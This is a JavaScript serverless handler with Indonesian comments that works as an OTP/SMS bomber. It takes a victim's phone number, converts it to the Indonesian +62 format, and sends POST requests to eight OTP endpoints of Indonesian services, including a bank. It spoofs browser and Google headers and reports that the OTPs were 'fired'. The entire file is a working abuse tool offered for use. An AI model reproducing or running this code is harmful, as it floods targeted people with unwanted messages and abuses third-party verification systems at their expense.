export default async function handler(req, res) {
    // Set CORS biar bisa diakses dari mana aja
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { phone } = req.body;
    if (!phone) {
        return res.status(400).json({ error: 'Nomor HP wajib diisi' });
    }

    // Format nomor ke 62
    let nomor = phone;
    if (nomor.startsWith('0')) nomor = '62' + nomor.slice(1);

    // Daftar Endpoint OTP yang bakal ditembak
    const endpoints = [
        "https://api.bri.co.id/v1/otp",
        "https://api.misteraladin.com/v1/otp",
        "https://api.kitabisa.com/v1/otp/send",
        "https://api.fore.coffee/api/v1/auth/otp",
        "https://api.janji.co.id/v1/auth/send-otp",
        "https://api.uwu.id/v1/auth/register",
        "https://api.ayoconnect.com/v1/otp",
        "https://api.espay.id/v1/otp"
    ];

    let results = [];
    
    for (let url of endpoints) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
                    'Origin': 'https://www.google.com',
                    'Referer': 'https://www.google.com/'
                },
                body: JSON.stringify({
                    phone: nomor,
                    msisdn: nomor,
                    phone_number: nomor
                })
            });
            
            results.push({ url, status: response.status });
        } catch (e) {
            results.push({ url, status: 'error' });
        }
    }

    return res.status(200).json({ 
        message: 'OTP berhasil ditembak',
        target: nomor,
        results: results
    });
}
